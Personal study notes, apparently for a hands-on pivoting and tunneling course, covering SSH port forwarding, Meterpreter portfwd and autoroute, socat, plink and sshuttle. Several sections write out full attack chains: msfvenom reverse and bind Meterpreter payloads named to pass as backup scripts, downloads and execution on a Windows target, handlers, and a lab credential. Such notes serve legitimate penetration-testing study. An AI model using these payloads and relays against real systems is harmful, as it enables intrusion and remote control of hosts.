
# Section 1,2

Pivoting is essentially the idea of moving to other networks through a compromised host to find more targets on different network segments. Tunneling encapsulates network traffic into another protocol and routes traffic through it.

Each network interface (NIC), such as `eth0`, `eth1`, `lo`, or `tun0`, has its own IP address and network information. In HTB, connecting to the VPN creates **`tun0`**, which is a tunnel that lets your machine reach the private HTB lab network; without it, you normally cannot access those labs. `eth0` may have a **public IP**, which can communicate over the Internet, while interfaces such as `tun0` usually have **private IPs**, which are used inside the lab/internal network. Anyone that wants to communicate over the Internet must have at least one public IP address assigned to an interface on the network, **NAT** translates private IPs into a public IP when communicating with the Internet.

🌐 IP Addressing:

An **IP address** identifies a device on a network. Think of it like a home address: the **network** is the neighborhood, and the **host** is the specific house. The **subnet mask** tells us which part of the IP is the network and which part is the host.

```
IP:          192.168.1.25
Subnet mask: 255.255.255.0

             NETWORK | HOST
             192.168.1 | 25
```

So devices like `192.168.1.10`, `192.168.1.20`, and `192.168.1.25` are on the same network. But `192.168.2.25` is on a different network. **The subnet mask decides the split**, so the first 3 numbers are not always the network. **Gateway = the device (usually a router) that sends traffic from your network to other networks.**

🔒 Private IP ranges

Private IPs are used inside local/internal networks and are **not directly routable over the Internet**:

```
10.0.0.0 – 10.255.255.255
172.16.0.0 – 172.31.255.255
192.168.0.0 – 192.168.255.255
```

Example:

```
10.129.221.36
255.255.0.0

NETWORK | HOST
10.129  | 221.36
```

Here, `10.129.0.0` is the network and `10.129.221.36` is the individual host.

### 🧠 Easy rule

> **IP = Network + Host**  
> **Subnet mask = tells us where the network part ends.**



| Command                                                 | Description                                                                                                                              |
| ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `ifconfig`                                              | Linux-based command that displays all current network configurations of a system.                                                        |
| `ipconfig`                                              | Windows-based command that displays all system network configurations.                                                                   |
| `netstat -r`                                            | Command used to display the routing table for all IPv4-based protocols.                                                                  |
| `nmap -sT -p22,3306 <IPaddressofTarget>`                | Nmap command used to scan a target for open ports allowing SSH or MySQL connections.                                                     |
| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>` | SSH command used to create an SSH tunnel from a local machine on local port `1234` to a remote target using port 3306.                   |
| `netstat -antp \| grep 1234`                            | Netstat option used to display network connections associated with a tunnel created. Using `grep` to filter based on local port `1234` . |
| `nmap -v -sV -p1234 localhost`                          | Nmap command used to scan a host through a connection that has been made on local port `1234`.                                           |


Before moving forward:

| Method                                          | When to use                                      | Main requirement    |
| ----------------------------------------------- | ------------------------------------------------ | ------------------- |
| **SSH `-L`**                                    | Reach **one internal service**                   | SSH access          |
| **SSH `-R`**                                    | Internal machine needs to **connect back to me** | SSH access          |
| **SSH `-D` + ProxyChains**                      | Access **many internal services**                | SSH access          |
| **Meterpreter `portfwd`**                       | Reach **one internal service**                   | Meterpreter session |
| **Meterpreter SOCKS + autoroute + ProxyChains** | Access **many internal services**                | Meterpreter session |
| **sshuttle**                                    | Route a **whole internal subnet**                | SSH access          |
| **Chisel**                                      | Need a tunnel **without SSH**                    | Chisel on pivot     |
| **ptunnel-ng**                                  | **TCP restricted, ICMP works**                   | ICMP allowed        |
| **SocksOverRDP**                                | Have **RDP to a Windows pivot**                  | RDP access          |

---
---


# Section 3 - Dynamic Port Forwarding with SSH and SOCKS Tunneling

If our attack machine **cannot directly reach a hidden network** (e.g. `172.16.5.0/23`) but a compromised **pivot/Ubuntu server can**, we can use **SSH dynamic port forwarding with a SOCKS proxy**. 

**SOCKS = proxy/middleman** that receives our tool's traffic, SOCKS is not the tunnel itself, while **SSH = tunnel** that carries it to the pivot. **SSH** has built-in port forwarding, including dynamic SOCKS forwarding.

**Why dynamic?** Because during a pentest we usually don't know which hosts/services inside the hidden network are useful. Instead of creating a separate SSH tunnel for every IP/port, SOCKS lets our tools send traffic to **different hosts and ports through the same tunnel**. So open ssh -D tunnel in one tab, keep it open, and use proxychains in other tabs to use other services.

| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>`                                               | SSH command that instructs the ssh client to request the SSH server forward all data via port `1234` to `localhost:3306`.                                                                                                                                            |
| ----------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                                                                                | SSH command used to perform a dynamic port forward on port `9050` and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.                                                                                                           |
| `tail -4 /etc/proxychains.conf`                                                                                         | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.                                                                                                                              |
| `proxychains nmap -v -sn 172.16.5.1-200`                                                                                | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range `172.16.5.1-200` with increased verbosity (`-v`) disabling ping scan (`-sn`).                                       |
| `proxychains nmap -v -Pn -sT 172.16.5.19`                                                                               | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (`-v`), disabling ping discover (`-Pn`), and using TCP connect scan type (`-sT`).                               |
| `proxychains msfconsole`                                                                                                | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.                                                                                                                                                                    |
| `msf6 > search rdp_scanner`                                                                                             | Metasploit search that attempts to find a module called `rdp_scanner`.                                                                                                                                                                                               |
| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123`                                                     | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.                                                                                                                                  |


## Question: SSH Tunnelling — Local Port Forwarding (`-L`)


I had SSH access to: `10.129.51.99`. From that machine, I could reach an internal machine: `172.16.5.19`. The internal machine had **RDP on port 3389**, but my own machine could not directly reach `172.16.5.19`. So I needed to use `10.129.51.99` as a **jump point** to reach the internal RDP service. So I used **SSH local port forwarding (**`-L`**)** as i have a specific destination, not dynamic and unknown.

The format is:

```
ssh -L <local_port>:<destination_ip>:<destination_port> user@<ssh_server>
```

For RDP:

```
ssh -L 1234:172.16.5.19:3389 ubuntu@10.129.51.99
```

This creates port `1234` on **my machine** and forwards it through `10.129.51.99` to `172.16.5.19:3389`. So, here destination ip and port are my internal ip and rdp port, which was not directly reachable. and i used ssh on the 1st machine where i can reach directly. Keep the Tunnel Open.

#### Connecting to the Forwarded RDP

Because port `1234` is opened on my own machine, I connect to:

```
xfreerdp /v:127.0.0.1:1234 /u:victor /p:'pass@123'
```

`127.0.0.1` means **my own machine**. The connection is:

```
My machine:1234 → SSH → 10.129.51.99 → 172.16.5.19:3389
```

I don't use `172.16.5.19` in `xfreerdp` because that is the **destination inside the tunnel**, not the local entry point.

#### `-L` vs `-D` + ProxyChains

I initially thought I needed ProxyChains to reach the internal machine. But for **one specific service**, `-L` is enough and you dont need to use proxychains to run the commands in other tabs. `-D` is different. It creates a **SOCKS proxy**, which can be used by multiple applications through ProxyChains. 

1. As a simple rule, when you use `-L`, you normally connect to `127.0.0.1:<local-port>`.

2. With **`ssh -D` + ProxyChains**, you normally use the **target IP**, not `127.0.0.1`.


---
---


# Section 4 - Remote/Reverse Port Forwarding with SSH


I have **3 machines**:

```text
My Attack Machine
10.10.15.5
```

```text
Ubuntu Pivot Server
10.129.15.50  ← Ubuntu's IP facing my attack machine
172.16.5.129  ← Ubuntu's IP facing the internal network
```

```text
Windows Target
172.16.5.19
```

The network looks like:

```text
My Attack Machine
10.10.15.5
      |
      | SSH
      ↓
Ubuntu Pivot
10.129.15.50
172.16.5.129
      |
      ↓
Windows Target
172.16.5.19
```

I can SSH from **my attack machine** to the **Ubuntu pivot** using `10.129.15.50`. Ubuntu can reach the Windows target using its internal IP `172.16.5.19`. However, Windows cannot directly reach my attack machine `10.10.15.5`. This becomes a problem when I want a **reverse shell**, because the reverse shell starts from Windows and needs to connect back to my attack machine. So I use the Ubuntu pivot as the middleman.

#### Why `-R`?

With `-L`, I previously wanted: My Attack Machine → SSH → Internal Windows Target. So I used:

```bash
ssh -L 1234:172.16.5.19:3389 ubuntu@10.129.51.99
```

With `-R`, I want the opposite direction:

```text
Windows Target → Ubuntu Pivot → SSH → My Attack Machine
```

So I use **remote/reverse port forwarding (****`-R`****)**.

#### Step 1 — Create the Windows Payload

First, I create a Meterpreter HTTPS payload. The Windows target can reach the **Ubuntu pivot's internal IP ****`172.16.5.129`**, but it cannot directly reach my attack machine. So I tell the payload to connect to Ubuntu:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

Here:

```text
172.16.5.129 → Ubuntu Pivot's internal IP
8080          → port on Ubuntu that Windows will connect to
```

So the payload is basically saying:

> "When I run on Windows, connect to the Ubuntu pivot at `172.16.5.129:8080`."

#### Step 2 — Start the Metasploit Listener

On **my attack machine (****`10.10.15.5`****)**, I start the Metasploit handler:

```text
msf6 > use exploit/multi/handler
```

Then:

```text
msf6 > set payload windows/x64/meterpreter/reverse_https
```

Then configure my attack machine to listen on port `8000`:

msf6 > set lhost 0.0.0.0  
msf6 > set lport 8000  
msf6 > run

Here, `0.0.0.0` tells Metasploit to listen on port `8000` on all available network interfaces of my attack machine. This is useful when the connection may arrive through a forwarded interface or tunnel, because I do not need to choose one specific local IP. Previously, `127.0.0.1` was used to bind the listener only to the loopback interface. That means the service could accept connections only from the same machine, not from other machines or forwarded network interfaces. `127.0.0.0` is a network address and is generally not used as the listener address; the usual loopback address is `127.0.0.1`.

In this example:

```text
0.0.0.0 → listen on all local interfaces
127.0.0.1 → listen only on the local machine
10.10.15.5 → listen specifically on my attack machine's attack-network interface
```

Using `0.0.0.0` does not mean that `0.0.0.0` is a real destination address for the Windows target. It is only a local bind address used by the listener. The SSH tunnel forwards the connection to the listener on my attack machine.

Now my attack machine is listening on:

```text
My Attack Machine:8000
```

`0.0.0.0` means the listener accepts connections on the available local interfaces.

But Windows cannot directly connect to my attack machine's `8000` because it has no route to my attack network.

#### Step 3 — Transfer the Payload to Ubuntu

From my attack machine, I copy the payload to the Ubuntu pivot:

```bash
scp backupscript.exe ubuntu@10.129.15.50:~/
```

Here:

```text
10.129.15.50 → Ubuntu Pivot's IP reachable from my attack machine
```

The file is now on Ubuntu.

#### Step 4 — Start an HTTP Server on Ubuntu

On the **Ubuntu pivot**, I start a simple web server:

```bash
python3 -m http.server 8123
```

Ubuntu is now serving the file on:

```text
Ubuntu internal IP: 172.16.5.129
Port: 8123
```

So Windows can access:

```text
http://172.16.5.129:8123/backupscript.exe
```

#### Step 5 — Download the Payload on Windows

On the **Windows target (****`172.16.5.19`****)**:

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Windows connects to: 172.16.5.129:8123, which is the **Ubuntu pivot**.

The payload is saved as:

```text
C:\backupscript.exe
```

#### Step 6 — Create the `-R` Tunnel

Now comes the important part. From **my attack machine**, I create the SSH remote port forward:

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN
```

Here:

```text
172.16.5.129:8080 → Ubuntu Pivot's internal IP and listening port
0.0.0.0:8000       → My Attack Machine's port 8000
10.129.15.50       → Ubuntu Pivot's SSH-accessible IP
```

The important part is:

```text
Ubuntu:172.16.5.129:8080
              ↓
          SSH tunnel
              ↓
My Attack Machine:8000
```

This means:

> "When something connects to port `8080` on Ubuntu's internal IP, send that connection through SSH to my attack machine's port `8000`."

#### Step 7 — Execute the Payload

On Windows, you need **Some initial access to Windows** → to execute the payload for more access:

```powershell
C:\backupscript.exe
```

The payload tries to connect to:

```text
Windows
172.16.5.19
      ↓
Ubuntu
172.16.5.129:8080
      ↓
SSH tunnel
      ↓
My Attack Machine
10.10.15.5:8000
```

The Metasploit handler on my attack machine receives the connection and establishes the Meterpreter session.

#### Why I Needed `-R`

The important problem is: Windows → My Attack Machine, doesn't work directly because Windows cannot route to my attack machine's network. But: Windows → Ubuntu does work. So I make Ubuntu forward the connection back through SSH:

```text
Windows
172.16.5.19
      ↓
Ubuntu
172.16.5.129:8080
      ↓
SSH
      ↓
My Attack Machine
10.10.15.5:8000
```

That's why I use **`-R`**.

#### `-L` vs `-R`

For `-L`: My Attack Machine → SSH → Internal Target. Example: `ssh -L 1234:172.16.5.19:3389 ubuntu@10.129.51.99`. I use `-L` when **I want to reach an internal service**.

For `-R`: Internal Target → SSH → My Attack Machine.  Example: `ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN`. I use `-R` when **the internal machine needs to connect back to something on my side**.

#### Important Difference From `-D`

`-D` creates a **SOCKS proxy**:

```bash
ssh -D 9050 ubuntu@10.129.15.50
```

Then I can use ProxyChains:

```bash
proxychains <command>
```

`-D` is useful when I want **multiple applications to communicate through the pivot**.

`-L` and `-R` are different because they forward a **specific port**.

#### Simple Memory Trick

```text
-L = Local forwarding
     My machine → Internal service

-D = Dynamic forwarding
     SOCKS proxy → Multiple destinations

-R = Remote/Reverse forwarding
     Internal machine → My machine
```


---
---


# Section 5 - Meterpreter Tunneling & Port Forwarding

If I already have SSH access to the Ubuntu pivot, I do not need Meterpreter just to perform the basic pivoting techniques. Sometimes I **don't have SSH credentials/access**, but I have obtained a **Meterpreter session** on the pivot. I use these techniques after already having a Meterpreter session on a pivot host.

### Which One Should I Use?

| First ask yourself…                                                                                 | Use this                                      |
| --------------------------------------------------------------------------------------------------- | --------------------------------------------- |
| **I have SSH + I need ONE specific internal service** (e.g., RDP on `172.16.5.19:3389`)             | SSH `-L`                                      |
| **I have SSH + I need MANY/unknown internal services or want to scan the internal network**         | SSH `-D` + ProxyChains                        |
| **I have SSH + the internal machine needs to CONNECT BACK to me**                                   | SSH `-R`                                      |
| **I have Meterpreter + I need ONE specific internal service (Like RDP, FTP, SMB etc)**              | Meterpreter `portfwd`                         |
| **I have Meterpreter + I need MANY/unknown internal services or want to scan the internal network** | Meterpreter SOCKS + `autoroute` + ProxyChains |
| **I have Meterpreter + the internal machine needs to CONNECT BACK to me**                           | Meterpreter `portfwd -R`                      |

### Example Network

```text
My Attack Machine = 10.10.14.18
Ubuntu Pivot      = 10.129.202.64
Ubuntu Internal IP = 172.16.5.129
Windows Target    = 172.16.5.19
Internal Network  = 172.16.5.0/23
```

The important idea is that **Ubuntu can reach the internal Windows machine**, while my Attack Machine cannot directly reach it.

---

# First: Get Meterpreter on the Ubuntu Pivot

If I don't already have Meterpreter on the Ubuntu Pivot, I can create a Linux Meterpreter payload.

### 1. Create payload — **On Attack Machine**

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

Here:

```text
10.10.14.18 = My Attack Machine
8080         = Port where my Attack Machine listens
```

### 2. Start handler — **On Attack Machine, inside Metasploit**

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```

`0.0.0.0` means **listen on all network interfaces of my machine**, instead of only one specific IP address. So the handler accepts connections coming to **any of my machine’s available IP addresses** on that port.

### 3. Transfer `backupjob` to Ubuntu

I can use SSH/SCP to transfer the file to the **Ubuntu Pivot**. If I don't have SSH, I need some other way to get the payload onto Ubuntu, such as an existing shell or exploited service.

### 4. Execute payload — **On Ubuntu Pivot**

```bash
chmod +x backupjob
./backupjob
```

Now I should get:

```text
meterpreter >
```

So I have a Meterpreter session on the **Ubuntu Pivot**.

---

# OPTION 1 — One Specific Service → `portfwd`

Use this when I know exactly which internal service I want Like RDP, FTP, SMB etc.

Example:

```text
Windows Target = 172.16.5.19
RDP            = 3389
```

### 1. Create the port forward — **Inside the Meterpreter session**

```text
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

Because I am already at:

```text
meterpreter >
```

I **do not need to select a session**. I am already inside the Meterpreter session on Ubuntu.

This means:

```text
My Attack Machine:3300
        ↓
Meterpreter / Ubuntu Pivot
        ↓
172.16.5.19:3389
```

`-l 3300` = local port on my Attack Machine

`-p 3389` = destination service port

`-r 172.16.5.19` = destination Windows machine

### 2. Connect to RDP — **From my Attack Machine**

```bash
xfreerdp /v:127.0.0.1:3300 /u:victor /p:'pass@123'
```

I use `127.0.0.1:3300` because **3300 is the local port opened on my Attack Machine**.

I do NOT connect directly to:

```text
172.16.5.19:3389
```

because my Attack Machine cannot directly reach that internal machine.

### Useful command — **Inside Meterpreter**

```text
meterpreter > help portfwd
```

Important options:

```text
-l = local port
-L = local host
-p = remote port
-r = remote host
-R = reverse forwarding
```



---

# OPTION 2 — Many Internal Hosts/Services → SOCKS + Autoroute + ProxyChains

Use this when I want to **scan or access multiple internal machines/services**.

For example:

```text
172.16.5.0/23
```

Instead of creating a separate port forward for every service, I create a **SOCKS proxy**.

## 1. Start SOCKS Proxy — **Inside Metasploit on my Attack Machine**

```text
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
```

This creates a SOCKS proxy on my **Attack Machine**:

```text
127.0.0.1:9050
```

`0.0.0.0` = listen on the available local interfaces.

### 2. Check that SOCKS is running — **Inside Metasploit**

```text
msf6 auxiliary(server/socks_proxy) > jobs
```

I should see the SOCKS proxy running as a background job. **I do not use `set SESSION` here.** The SOCKS server itself does not need me to select the Meterpreter session at this point.

---

## 3. Configure ProxyChains — **On my Attack Machine**

Edit:

```text
/etc/proxychains.conf
```

Add:

```text
socks4 127.0.0.1 9050
```

Here:

```text
127.0.0.1 = My Attack Machine
9050      = My local SOCKS proxy
```

If I configured SOCKS5:

```text
socks5 127.0.0.1 9050
```

The SOCKS version should match.

---

## 4. Background the Meterpreter Session

If I am currently inside:

```text
meterpreter >
```

and need to use a Metasploit module from `msf6 >`, I first background the session:

```text
meterpreter > bg
```

Now I return to:

```text
msf6 >
```

I can see my available sessions with:

```text
msf6 > sessions
```

For example:

```text
Id  Type
--  ----
1   meterpreter x64/linux
```

Here, **Session 1 is my Meterpreter session on the Ubuntu Pivot**.

---

## 5. Add the Internal Route — **Inside Metasploit**

Now I use the `autoroute` module and explicitly select the Meterpreter session:

```text
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

Here:

```text
SESSION 1  = My Meterpreter session on Ubuntu
172.16.5.0 = Internal network
```

This tells Metasploit:

> Send traffic for the internal network through **Meterpreter Session 1**, which is my Ubuntu Pivot.

**This is the important place where I select the session.**

---

## 6. Check the Route — **Inside Meterpreter**

```text
meterpreter > run autoroute -p
```

I should see something similar to:

```text
Subnet       Netmask          Gateway
172.16.5.0   255.255.254.0   Session 1
```

The older command:

```text
meterpreter > run autoroute -s 172.16.5.0/23
```

may also work, but it is **deprecated**. The preferred method is:

```text
post/multi/manage/autoroute
```

---

## 7. Scan the Internal Target — **From my Attack Machine**

For example, check RDP on Windows:

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

The important thing is:

```text
Nmap
 ↓
ProxyChains
 ↓
127.0.0.1:9050
 ↓
Metasploit SOCKS
 ↓
Meterpreter Session 1
 ↓
Ubuntu Pivot
 ↓
172.16.5.19:3389
```

I specify the **real internal target**:

```text
172.16.5.19
```

I do NOT put `127.0.0.1` as the Nmap target. `127.0.0.1:9050` is only the **local SOCKS proxy** that ProxyChains connects to.

### Why `-sT`?

ProxyChains works by proxying TCP connections, so a TCP Connect Scan is appropriate:

```text
-sT
```

`-Pn` tells Nmap not to rely on normal host discovery/ping.



---

# Finding Hosts in the Internal Network

If I want to discover live machines in:

```text
172.16.5.0/23
```

I can perform a ping sweep **from the pivot**.

## Meterpreter Ping Sweep — **Inside Meterpreter**

```text
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

This causes the **Ubuntu Pivot** to generate the ICMP traffic toward the internal network.

### Linux Ping Sweep — **On Linux Pivot**

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

### Windows CMD Ping Sweep — **On Windows Pivot**

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### PowerShell Ping Sweep — **On Windows Pivot**

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

Sometimes the first ping sweep misses hosts because the pivot is still building its **ARP cache**. If needed, run the sweep again. If ICMP is blocked by the target firewall, ping won't help. I can instead perform a TCP scan through the pivot:

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -Pn
```

---

# OPTION 3 — Internal Machine → Connect Back to Me → `portfwd -R`

This is different. Here, the **internal Windows machine needs to initiate the connection back toward me**, but it cannot directly reach my Attack Machine.

Example:

```text
My Attack Machine = 10.10.14.18
Ubuntu Pivot      = 172.16.5.129
Windows Target    = 172.16.5.19
```

Windows can reach Ubuntu:

```text
Windows → 172.16.5.129
```

but cannot directly reach:

```text
Windows → 10.10.14.18
```

So I make Ubuntu forward the connection for me.

## 1. Create Reverse Port Forward — **Inside Meterpreter**

```text
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

Because I am already at `meterpreter >`, **I do not need to select a session**.

This creates:

```text
Windows
   ↓
Ubuntu Pivot:1234
   ↓
Meterpreter
   ↓
Attack Machine:8081
```

The important idea is:

```text
-p 1234 = port Ubuntu listens for the incoming connection
-l 8081 = port on my Attack Machine receiving it
-L 10.10.14.18 = my Attack Machine's IP
```

---

## 2. Start Handler — **On Attack Machine, inside Metasploit**

First background the Meterpreter session:

```text
meterpreter > bg
```

Then:

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > run
```

My Attack Machine is now listening on:

```text
0.0.0.0:8081
```

No `set SESSION` is needed here because the handler is not being used as a post-exploitation module against the existing Meterpreter session.

---

## 3. Create Windows Payload — **On Attack Machine**

The Windows payload must connect to **Ubuntu**, because Windows can reach Ubuntu:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

Notice:

```text
LHOST=172.16.5.129
LPORT=1234
```

These are **Ubuntu's IP and port**, not my Attack Machine's. The connection is:

```text
Windows → 172.16.5.129:1234
```

Then the reverse port forward sends it to:

```text
10.10.14.18:8081
```

where my handler is listening. After that, **Transfer and execute `backupscript.exe` on the Windows Target.** Once executed, Windows connects to `172.16.5.129:1234`, and the existing reverse port forward sends the connection to my handler at `10.10.14.18:8081`.

---

# When Do I Use `set SESSION`?

This is the simple rule:

```text
meterpreter >
    ↓
Already inside a session
    ↓
NO set SESSION needed
```

If I background it:

```text
meterpreter > bg
```

I return to:

```text
msf6 >
```

Now, if I use a Metasploit module that requires a Meterpreter session, I select it:

```text
msf6 > sessions
msf6 > use post/multi/manage/autoroute
msf6 post(...) > set SESSION 1
```

So:

> **`meterpreter >` = session already selected.**

> **`msf6 >` + a module requiring a session = select it with `set SESSION <ID>`.**

---

# The Most Important Difference

Don't get confused by the word **reverse**.

### Normal `portfwd`

I initiate the connection from my Attack Machine:

```text
Attack Machine → Pivot → Internal Target
```

Example:

```text
xfreerdp → localhost:3300 → Ubuntu → Windows:3389
```

### Reverse `portfwd -R`

The internal machine initiates the connection:

```text
Internal Target → Pivot → Attack Machine
```

Example:

```text
Windows → Ubuntu:1234 → Attack Machine:8081
```


---
---


# Section 6 - Socat Redirection with a Reverse Shell

So basically, I first get access to Ubuntu. From there, I can use Socat, SSH `-L`/`-R`, or Meterpreter depending on what I need. All of them are basically ways to connect to an internal machine/service or make an internal machine connect back to me. If I need a reverse shell, I also need to get the payload onto Windows and execute it there. SSH has `-L` and `-R`; Socat doesn't. With Socat, I manually can create the relay in whichever direction I need.


### Example Network

```text
Attack Machine = 10.10.14.18
Ubuntu Pivot   = 172.16.5.129
Windows Target = 172.16.5.19
```

The goal is:

```text
Windows → Ubuntu/Socat → Attack Machine
```

---

## 1. Start Socat — **On Ubuntu Pivot** (first connect to ubuntu)

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

This means:

```text
Ubuntu:8080 → Attack Machine:80
```

So when Windows connects to `Ubuntu:8080`, Socat passes the connection to my Attack Machine on port `80`. Keep Socat running.

---

## 2. Create Windows Payload — **On Attack Machine**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

Important:

```text
LHOST = Ubuntu Pivot = 172.16.5.129
LPORT = Socat port    = 8080
```

So the Windows payload connects to:

```text
Windows → 172.16.5.129:8080
```

---

## 3. Transfer Payload — **To Windows Target**

Transfer to the **Windows Target** using any available file-transfer method.

---

## 4. Start Metasploit Handler — **On Attack Machine**

```bash
sudo msfconsole
```

Then:

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
msf6 exploit(multi/handler) > run
```

Here:

```text
0.0.0.0:80 = Attack Machine listening for the connection
```

---

## 5. Execute Payload — **On Windows Target**

```cmd
C:\> backupscript.exe
```

The connection should travel:

```text
Windows
   ↓
Ubuntu:8080
   ↓
Socat
   ↓
Attack Machine:80
   ↓
Metasploit
   ↓
meterpreter >
```

If successful:

```text
meterpreter > getuid
```

Example:

```text
Server username: INLANEFREIGHT\victor
```


---
---


# Section 7 - Socat Redirection with a Bind Shell


Use this when the **Windows Target can listen on a port**, and I need to reach that bind shell through the **Ubuntu Pivot**.

### Example Network

```text
Attack Machine = 10.10.14.18
Ubuntu Pivot   = 10.129.202.64
Windows Target = 172.16.5.19
```

The connection will be:

```text
Attack Machine → Ubuntu:8080 → Socat → Windows:8443
```

## 1. Create Windows Bind Payload — **On Attack Machine**

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

Here:

```text
8443 = Port where the Windows Target will listen
```

### 2. Transfer Payload — **To Windows Target**

Transfer to the **Windows Target** using any available file-transfer method.

Then execute it **on Windows**:

```cmd
C:\> backupjob.exe
```

Now Windows starts listening on:

```text
Windows Target:8443
```

---

## 3. Start Socat — **On Ubuntu Pivot**

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

This means:

```text
Ubuntu:8080 → Windows:8443
```

Socat receives my connection on Ubuntu `8080` and forwards it to the Windows bind shell on `8443`. Keep Socat running.

---

## 4. Start Metasploit Bind Handler — **On Attack Machine**

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
```

Here:

```text
RHOST = Ubuntu Pivot = 10.129.202.64
LPORT = Ubuntu Socat port = 8080
```

The handler connects to:

```text
Ubuntu:8080
```

Socat forwards the connection to:

```text
Windows:8443
```

### Final Connection

```text
Attack Machine
      ↓
Ubuntu:8080
      ↓
Socat
      ↓
Windows:8443
      ↓
Meterpreter
```

If successful:

```text
meterpreter > getuid
```


---
---

# Section 8 - SSH for Windows: plink.exe

**Plink = SSH client for Windows.**  
Use Plink when my **Attack Machine is Windows** and I need to use **SSH for pivoting**, especially when I want to create a **SOCKS proxy** and access internal targets through the pivot.

#### Example

```text
Windows Attack Machine = 10.10.15.5
Ubuntu Pivot           = 10.129.15.50
SOCKS Port             = 9050
target                 = T_ip
```

### Create SOCKS Tunnel — **On Windows Attack Machine**

```cmd
plink -ssh -D 9050 ubuntu@10.129.15.50
```

This creates:

```text
Windows → Plink → Ubuntu Pivot
              ↓
        SOCKS 127.0.0.1:9050
```

Keep the Plink connection open.

### Configure Proxifier (Windows equivalent of `proxychains`)— **On Windows Attack Machine**

Set:

```text
Address = 127.0.0.1
Port    = 9050
Type    = SOCKS4
```

**Proxifier makes Windows applications use the SOCKS tunnel created by Plink.** For example, after configuring Proxifier, I can run:

```cmd
mstsc.exe (Windows Remote Desktop (RDP) client.)
```

Then I enter the internal Windows target’s IP address. Proxifier sends the RDP connection through the Plink SOCKS tunnel to the Ubuntu Pivot.


---
---

# Section 9 - SSH Pivoting with Sshuttle

If I already have **SSH access to the Ubuntu pivot**, `sshuttle` lets me route traffic to the internal network **without manually setting up `-L`, `-D`, ProxyChains, or Meterpreter**. The important part: sshuttle = pivot/routing, not a shell.

| `sudo apt-get install sshuttle`                       | Uses apt-get to install the tool sshuttle.                                                                                                                                          |
| ----------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v` | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (`172.16.5.0`). |
Then, simply Use an existing service (e.g. Nmap/RDP/SMB) or an authorized exploit. `sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn`



---
---



# Section 10 - Web Server Pivoting with Rpivot


Use **Rpivot** when:

- I have access to an **Ubuntu pivot**.
- Ubuntu can reach the **internal network**.
- I need to access **multiple internal hosts/services**.
- I **can't or don't want to use SSH tunneling or Meterpreter**.
- I specifically need a **reverse SOCKS tunnel**.

